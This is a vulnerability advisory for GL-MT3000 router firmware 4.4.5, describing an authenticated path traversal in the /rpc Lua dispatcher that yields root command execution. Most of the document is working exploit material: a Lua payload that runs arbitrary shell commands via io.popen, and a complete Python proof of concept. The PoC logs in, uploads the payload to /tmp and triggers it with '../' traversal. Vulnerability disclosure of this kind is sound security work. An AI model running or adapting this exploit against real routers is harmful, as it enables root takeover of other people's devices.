Submission Date: 2026.5.19
Vendor: GL-MT3000
Version: 4.4.5
Firmware: openwrt-mt3000-4.4.5-0811-1691754744.tar
Download Link: https://dl.gl-inet.cn/router/mt3000/stable


An authenticated path traversal vulnerability exists in the `/rpc` Lua dispatch framework of the affected product, enabling arbitrary Lua code execution and subsequent root command execution. The `rpc.lua` module at `/usr/lib/lua/oui/rpc.lua` dynamically loads plugins via `dofile("/usr/lib/oui-httpd/rpc/" .. object)` without validating that the resolved path stays within the intended plugin directory. An attacker who uploads a malicious Lua file to `/tmp/` via the authenticated `/upload` endpoint can use `../` path traversal in the `object` parameter to execute arbitrary Lua code, which in turn executes shell commands via `io.popen()` with root privileges.

The reported vulnerable flow is:

```text
Stage 1 — Upload malicious Lua payload:
  Authenticated attacker
    -> POST /upload (multipart) path=/tmp/poc.lua file=<Lua payload>
    -> oui-upload.lua validates path starts with /tmp/
    -> File written to /tmp/poc.lua

Stage 2 — Trigger path traversal:
    -> POST /rpc call("../../../../tmp/poc.lua","run",{"cmd":"<cmd>"})
    -> rpc.lua line 160:
         script = "/usr/lib/oui-httpd/rpc/" .. "../../../../tmp/poc.lua"
    -> Normalizes to /tmp/poc.lua
    -> fs.access(script) -> true (no dir restriction)
    -> dofile(script) -> executes attacker's Lua
    -> M.run({cmd="<cmd>"}) -> io.popen(cmd) -> RCE
```

The vulnerable code in `/usr/lib/lua/oui/rpc.lua`:

![image-20260519000007](image/image-20260519000007.png)

```lua
M.call = function(object, method, args)
    if not objects[object] then
        local script = "/usr/lib/oui-httpd/rpc/" .. object  -- Path traversal
        if not fs.access(script) then
            return glc_call(object, method, args)
        end
        local ok, tb = pcall(dofile, script)  -- Arbitrary file execution
        -- ...
    end
    local fn = objects[object] and objects[object][method]
    return fn(args)  -- User-controlled args, zero filtering
end
```

Four `../` components are required to traverse from `/usr/lib/oui-httpd/rpc/` to the root and into `/tmp/`:

```
/usr/lib/oui-httpd/rpc/ ../../../../ tmp/poc.lua
                        ├──┘├──┘├──┘├──┘
                        rpc  oui  lib usr → /
                                       /tmp/poc.lua
```

The Lua payload uploaded to `/tmp/`:

```lua
local M = {}
function M.run(args)
    local cmd = args and args.cmd or "id"
    local f = io.popen(cmd)
    local out = f and f:read("*a") or ""
    if f then f:close() end
    return { output = out }
end
return M
```

Exploit the vulnerability by sending crafted HTTP requests:

```python
#!/usr/bin/env python3
"""PoC: /upload + rpc.lua dofile path traversal -> Lua RCE"""
import hashlib, json, ssl, subprocess, sys, urllib.request, uuid

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://192.168.8.1"
CMD    = sys.argv[2] if len(sys.argv) > 2 else "id>/tmp/poc16_out"
USER   = sys.argv[3] if len(sys.argv) > 3 else "root"
PASS   = sys.argv[4] if len(sys.argv) > 4 else "12345678Q!"

LUA_PAYLOAD = b'''local M = {}
function M.run(args)
    local cmd = args and args.cmd or "id"
    local f = io.popen(cmd)
    local out = f and f:read("*a") or ""
    if f then f:close() end
    return { output = out }
end
return M
'''

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def post(path, data):
    req = urllib.request.Request(f"{TARGET}{path}", data=json.dumps(data).encode(),
        headers={"Content-Type":"application/json"}, method="POST")
    return json.loads(urllib.request.urlopen(req, timeout=15, context=ctx).read())

ch = post("/rpc", {"jsonrpc":"2.0","id":1,"method":"challenge","params":{"username":USER}})
cr = subprocess.check_output(["openssl","passwd","-1","-salt",ch["result"]["salt"],PASS], text=True).strip()
h = hashlib.md5(f"{USER}:{cr}:{ch['result']['nonce']}".encode()).hexdigest()
sid = post("/rpc", {"jsonrpc":"2.0","id":2,"method":"login",
    "params":{"username":USER,"hash":h}})["result"]["sid"]

# Upload Lua payload
boundary = f"----codex-{uuid.uuid4().hex}"
parts = []
for n,v in [("path","/tmp/poc16_rpc.lua"),("sid",sid),("size",str(len(LUA_PAYLOAD)))]:
    parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n{v}\r\n".encode())
parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"poc16.lua\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()+LUA_PAYLOAD+b"\r\n")
parts.append(f"--{boundary}--\r\n".encode())
urllib.request.urlopen(urllib.request.Request(f"{TARGET}/upload", data=b"".join(parts),
    headers={"Content-Type":f"multipart/form-data; boundary={boundary}"}, method="POST"), timeout=15, context=ctx)

# Trigger RPC with path traversal
rpc_object = "../../../../tmp/poc16_rpc.lua"
result = post("/rpc", {"jsonrpc":"2.0","id":4,"method":"call",
    "params":[sid, rpc_object, "run", {"cmd":CMD}]})
output = result.get("result", {}).get("output", "") if "result" in result else str(result)
print(f"[+] rpc object: {rpc_object}")
print(f"[+] cmd: {CMD}")
print(f"[+] output: {output}")
```

The exploitation is shown below.

![image-20260519000008](image/image-20260519000008.png)
